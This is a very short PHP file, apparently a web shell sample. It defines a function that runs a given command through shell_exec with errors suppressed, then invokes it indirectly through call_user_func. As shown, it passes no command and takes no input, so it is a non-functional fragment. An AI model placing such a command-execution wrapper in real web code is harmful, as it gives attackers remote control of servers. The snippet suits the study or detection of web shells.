<?php
function do_phpfun($cmd,$fun) {
	$res = @shell_exec($cmd);
	return $res;
}

call_user_func('do_phpfun');
?>